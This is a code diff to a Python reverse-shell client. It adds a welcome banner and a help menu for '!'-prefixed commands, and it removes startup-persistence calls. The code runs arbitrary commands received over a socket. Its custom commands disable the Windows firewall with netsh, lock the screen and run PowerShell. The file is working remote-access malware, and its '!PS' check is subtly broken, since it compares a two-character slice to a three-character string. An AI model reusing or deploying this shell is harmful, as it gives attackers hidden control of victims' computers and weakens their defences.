@@ -2,7 +2,6 @@ import os
 import socket
 import subprocess
 import ctypes
-import startup
 
 
 class Shell:
@@ -22,7 +21,13 @@ class Shell:
         """
         Executes received commands from the server and sends the output back through the socket
         """
-
+        
+        welcome_msg = "\n\n\nReverse shell connection succesful! \n Type 'help' for list of custom commands, \
+            and 'exit' or 'quit' to return \n \
+            Custom commands start with '!' \n\n"
+            
+        self.sock.send(str.encode(welcome_msg))
+        
         while 1:  # Infinite loop
             try:
                 # Gets cwd and sends to server
@@ -32,7 +37,15 @@ class Shell:
                 data = self.sock.recv(1024).decode("UTF-8")
                 data = data.strip('\n')
 
-                # Special cases
+                # opens help menu
+                if data == "!help":
+                    help_msg = "Custom commands are: \
+                        \n !PS [command]: Execute command with powershell \
+                        \n !firewall on/off: Turns on/off firewall \
+                        \n !lock: Locks screen of client \
+                        \n !help: Opens this menu"
+            
+                    self.sock.send(str.encode(help_msg))
 
                 # Exits shell
                 if data == "quit" or data == "exit":
@@ -47,27 +60,22 @@ class Shell:
                     data = "dir"
 
                 # Disables/enables firewall
-                if data == "firewall off":
+                if data == "!firewall off":
                     data = "netsh advfirewall set currentprofile state off"
-                if data == "firewall on":
+                if data == "!firewall on":
                     data = "netsh advfirewall set currentprofile state on"
 
                 # Locks the screen of client
-                if data == "lock":
+                if data == "!lock":
                     ctypes.windll.user32.LockWorkStation()
                     data = "echo Screen locked"
 
                 # Executes command with powershell
-                if data[:2] == "PS":
+                if data[:2] == "!PS":
                     data = "PowerShell.exe -command {}".format(data[3:])
                 
-                if data == "add startup":
-                    startup.add_startup()
-                
-                if data == "rm startup":
-                    startup.remove_startup()
 
-                if len(data) > 0:
+                if len(data) > 0 and not data == "!help":
                     # Executes arbitrary command
                     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                             stdin=subprocess.PIPE)
@@ -79,7 +87,3 @@ class Shell:
 
             except socket.error:
                 break
-
-    
-
-
